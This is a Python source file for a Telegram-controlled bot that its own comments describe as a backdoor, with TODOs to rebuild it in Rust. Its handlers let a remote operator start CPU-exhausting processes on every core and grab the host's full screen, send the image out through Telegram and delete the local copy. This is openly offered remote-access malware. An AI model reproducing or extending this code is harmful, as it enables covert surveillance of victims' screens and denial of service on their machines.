



'''
References:
        https://docs.rs/telebot/0.3.1/telebot/
	https://github.com/wildonion/stomegranate --------------------------- use ideas in this repo to build the backdoor
	https://github.com/wildonion/stomegranate/blob/master/thewobox/worutle.py
TODOs:
   proof-of-Telegram_Sloving_Question_Bot-idea => Build A Telegram Bot To Solve An Specific Question From Its Picture And Send Us The Answer In A picture
   use rust programming language to build some system level modules
   build telebot APIs in rust to call them in here or build the backdoor completely in rust from scratch
'''

import sys
import os
import logging
import multiprocessing
from utils.burn import burn_cpu
import pyscreenshot as ImageGrab
from aiogram import Bot, Dispatcher, executor, types



API_TOKEN = ''
logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)



@dp.message_handler(commands=['burn_cpu'])
async def burn(message: types.message):
	process_count = 1
	while(process_count <= multiprocessing.cpu_count()):
		process_to_be_not_seen_again = multiprocessing.Process(target=burn_cpu)
		process_to_be_not_seen_again.start()
		process_count += 1
	await message.reply("Burning CPU...")



@dp.message_handler(commands=['sc'])
async def sc(message: types.Message):
	im = ImageGrab.grab()
	im.save('sc.png')
	with open('sc.png', 'rb') as photo:
		await message.reply_photo(photo, caption='fullsc')
	os.remove("sc.png")


if __name__ == '__main__':
	executor.start_polling(dp, skip_updates=True)
